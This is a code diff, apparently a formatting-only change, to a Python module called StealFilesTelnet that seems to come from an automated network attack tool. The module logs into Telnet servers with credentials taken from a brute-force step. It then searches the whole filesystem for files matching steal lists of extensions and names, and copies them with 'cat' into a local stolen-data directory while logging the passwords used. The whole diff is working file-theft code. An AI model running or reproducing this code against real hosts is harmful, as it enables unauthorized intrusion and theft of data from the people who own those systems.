@@ -21,10 +21,12 @@ b_status = "steal_files_telnet"
 b_parent = "TelnetBruteforce"
 b_port = 23
 
+
 class StealFilesTelnet:
     """
     Class to handle the process of stealing files from Telnet servers.
     """
+
     def __init__(self, shared_data):
         try:
             self.shared_data = shared_data
@@ -41,15 +43,17 @@ class StealFilesTelnet:
         try:
             tn = telnetlib.Telnet(ip)
             tn.read_until(b"login: ")
-            tn.write(username.encode('ascii') + b"\n")
+            tn.write(username.encode("ascii") + b"\n")
             if password:
                 tn.read_until(b"Password: ")
-                tn.write(password.encode('ascii') + b"\n")
+                tn.write(password.encode("ascii") + b"\n")
             tn.read_until(b"$", timeout=10)
             logger.info(f"Connected to {ip} via Telnet with username {username}")
             return tn
         except Exception as e:
-            logger.error(f"Telnet connection error for {ip} with user '{username}' & password '{password}': {e}")
+            logger.error(
+                f"Telnet connection error for {ip} with user '{username}' & password '{password}': {e}"
+            )
             return None
 
     def find_files(self, tn, dir_path):
@@ -60,15 +64,18 @@ class StealFilesTelnet:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("File search interrupted due to orchestrator exit.")
                 return []
-            tn.write(f'find {dir_path} -type f\n'.encode('ascii'))
-            files = tn.read_until(b"$", timeout=10).decode('ascii').splitlines()
+            tn.write(f"find {dir_path} -type f\n".encode("ascii"))
+            files = tn.read_until(b"$", timeout=10).decode("ascii").splitlines()
             matching_files = []
             for file in files:
                 if self.shared_data.orchestrator_should_exit:
                     logger.info("File search interrupted due to orchestrator exit.")
                     return []
-                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
-                   any(file_name in file for file_name in self.shared_data.steal_file_names):
+                if any(
+                    file.endswith(ext) for ext in self.shared_data.steal_file_extensions
+                ) or any(
+                    file_name in file for file_name in self.shared_data.steal_file_names
+                ):
                     matching_files.append(file.strip())
             logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
             return matching_files
@@ -82,13 +89,15 @@ class StealFilesTelnet:
         """
         try:
             if self.shared_data.orchestrator_should_exit:
-                logger.info("File stealing process interrupted due to orchestrator exit.")
+                logger.info(
+                    "File stealing process interrupted due to orchestrator exit."
+                )
                 return
-            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
+            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, "/"))
             local_file_dir = os.path.dirname(local_file_path)
             os.makedirs(local_file_dir, exist_ok=True)
-            with open(local_file_path, 'wb') as f:
-                tn.write(f'cat {remote_file}\n'.encode('ascii'))
+            with open(local_file_path, "wb") as f:
+                tn.write(f"cat {remote_file}\n".encode("ascii"))
                 f.write(tn.read_until(b"$", timeout=10))
             logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
         except Exception as e:
@@ -99,7 +108,9 @@ class StealFilesTelnet:
         Steal files from the remote server using Telnet.
         """
         try:
-            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
+            if "success" in row.get(
+                self.b_parent_action, ""
+            ):  # Verify if the parent action is successful
                 self.shared_data.bjornorch_status = "StealFilesTelnet"
                 logger.info(f"Stealing files from {ip}:{port}...")
                 # Wait a bit because it's too fast to see the status change
@@ -108,24 +119,26 @@ class StealFilesTelnet:
                 telnetfile = self.shared_data.telnetfile
                 credentials = []
                 if os.path.exists(telnetfile):
-                    with open(telnetfile, 'r') as f:
+                    with open(telnetfile, "r") as f:
                         lines = f.readlines()[1:]  # Skip the header
                         for line in lines:
-                            parts = line.strip().split(',')
+                            parts = line.strip().split(",")
                             if parts[1] == ip:
                                 credentials.append((parts[3], parts[4]))
                     logger.info(f"Found {len(credentials)} credentials for {ip}")
 
                 if not credentials:
                     logger.error(f"No valid credentials found for {ip}. Skipping...")
-                    return 'failed'
+                    return "failed"
 
                 def timeout():
                     """
                     Timeout function to stop the execution if no Telnet connection is established.
                     """
                     if not self.telnet_connected:
-                        logger.error(f"No Telnet connection established within 4 minutes for {ip}. Marking as failed.")
+                        logger.error(
+                            f"No Telnet connection established within 4 minutes for {ip}. Marking as failed."
+                        )
                         self.stop_execution = True
 
                 timer = Timer(240, timeout)  # 4 minutes timeout
@@ -135,41 +148,57 @@ class StealFilesTelnet:
                 success = False
                 for username, password in credentials:
                     if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                        logger.info("Steal files execution interrupted due to orchestrator exit.")
+                        logger.info(
+                            "Steal files execution interrupted due to orchestrator exit."
+                        )
                         break
                     try:
                         logger.info(f"Trying credential {username}:{password} for {ip}")
                         tn = self.connect_telnet(ip, username, password)
                         if tn:
-                            remote_files = self.find_files(tn, '/')
-                            mac = row['MAC Address']
-                            local_dir = os.path.join(self.shared_data.datastolendir, f"telnet/{mac}_{ip}")
+                            remote_files = self.find_files(tn, "/")
+                            mac = row["MAC Address"]
+                            local_dir = os.path.join(
+                                self.shared_data.datastolendir, f"telnet/{mac}_{ip}"
+                            )
                             if remote_files:
                                 for remote_file in remote_files:
-                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                                        logger.info("File stealing process interrupted due to orchestrator exit.")
+                                    if (
+                                        self.stop_execution
+                                        or self.shared_data.orchestrator_should_exit
+                                    ):
+                                        logger.info(
+                                            "File stealing process interrupted due to orchestrator exit."
+                                        )
                                         break
                                     self.steal_file(tn, remote_file, local_dir)
                                 success = True
                                 countfiles = len(remote_files)
-                                logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
+                                logger.success(
+                                    f"Successfully stolen {countfiles} files from {ip}:{port} using {username}"
+                                )
                             tn.close()
                             if success:
                                 timer.cancel()  # Cancel the timer if the operation is successful
-                                return 'success'  # Return success if the operation is successful
+                                return "success"  # Return success if the operation is successful
                     except Exception as e:
-                        logger.error(f"Error stealing files from {ip} with user '{username}': {e}")
+                        logger.error(
+                            f"Error stealing files from {ip} with user '{username}': {e}"
+                        )
 
                 # Ensure the action is marked as failed if no files were found
                 if not success:
                     logger.error(f"Failed to steal any files from {ip}:{port}")
-                    return 'failed'
+                    return "failed"
             else:
-                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
-                return 'failed'
+                logger.error(
+                    f"Parent action not successful for {ip}. Skipping steal files action."
+                )
+                return "failed"
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
-            return 'failed'
+            return "failed"
+
 
 if __name__ == "__main__":
     try:
